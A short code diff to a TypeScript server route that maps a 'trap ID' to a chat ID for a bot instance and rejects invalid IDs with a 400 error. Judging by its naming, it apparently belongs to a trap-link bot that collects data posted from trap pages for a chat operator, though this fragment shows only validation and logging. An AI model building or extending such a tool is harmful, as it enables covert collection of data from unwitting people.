@@ -413,7 +413,13 @@ async function startServer() {
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
     console.log(`[DEBUG] ID: ${id}, ChatID: ${chatId}, BotInstanceExists: ${!!botInstance}`);
-    if (botInstance && chatId) {
+    
+    if (!chatId) {
+        console.error(`[DEBUG] INVALID CHATID FOR ID: ${id}`);
+        return res.status(400).send('Invalid Trap ID');
+    }
+
+    if (botInstance) {
       const data = req.body as any;
       const tmplId = data.tmplId || '1';
       const templateName = templates[tmplId] ? templates[tmplId].name : 'ᴅᴇꜰᴀᴜʟᴛ';
